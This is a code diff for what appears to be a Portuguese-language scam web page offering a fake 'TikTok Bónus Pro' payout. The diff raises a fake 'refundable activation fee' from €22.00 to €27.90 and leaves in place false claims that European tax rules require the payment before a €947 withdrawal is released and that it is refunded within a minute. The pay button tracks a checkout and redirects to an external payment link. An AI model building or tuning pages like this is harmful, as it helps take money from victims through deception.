@@ -126,11 +126,11 @@ const pages = {
           Taxa de Ativação TikTok Bónus Pro
         </div>
         <div class="confirmation-fee-amount">
-          € 22.00
+          € 27.90
           <span class="confirmation-reembolso-badge">VALOR REEMBOLSÁVEL</span>
         </div>
         <div class="confirmation-fee-description">
-          De acordo com os regulamentos fiscais europeus, é necessário um pagamento de <span class="bold">€22,00</span> antes que a libertação do seu levantamento totalizando <span class="bold">€947,00</span> possa ser processada. Este valor ser-lhe-á reembolsado automaticamente no prazo de 1 minuto.
+          De acordo com os regulamentos fiscais europeus, é necessário um pagamento de <span class="bold">€27,90</span> antes que a libertação do seu levantamento totalizando <span class="bold">€947,00</span> possa ser processada. Este valor ser-lhe-á reembolsado automaticamente no prazo de 1 minuto.
         </div>
       </div>
 
@@ -168,7 +168,7 @@ const pages = {
                 Completar ativação
               </div>
               <div class="confirmation-requirement-description">
-                €22,00 obrigatórios sob regulamentos europeus
+                €27,90 obrigatórios sob regulamentos europeus
               </div>
             </div>
           </div>
@@ -255,7 +255,7 @@ const pages = {
 // Estado da página
 let currentPage = null;
 
-function initializePages() {}
+function initializePages() { }
 
 function showPage(pageName) {
   const container = document.querySelector(".app-container");
@@ -303,7 +303,7 @@ function setupRegistrationPage() {
   if (payButton) {
     payButton.addEventListener("click", (e) => {
       e.preventDefault();
-      if (typeof trackInitiateCheckout === "function") trackInitiateCheckout(22.00);
+      if (typeof trackInitiateCheckout === "function") trackInitiateCheckout(27.90);
       window.location.href = "https://waymb.com/c?username=eduardotreonix&product=1" + window.location.search;
     });
   }
@@ -316,7 +316,7 @@ function setupVideoPage() {
 }
 
 let selectedPaymentMethod = null;
-function openMethodModal() { 
+function openMethodModal() {
   // Usa a função global definida em of2.html se disponível, ou lógica local
   const modal = document.getElementById("method-modal");
   if (modal) modal.style.display = "flex";
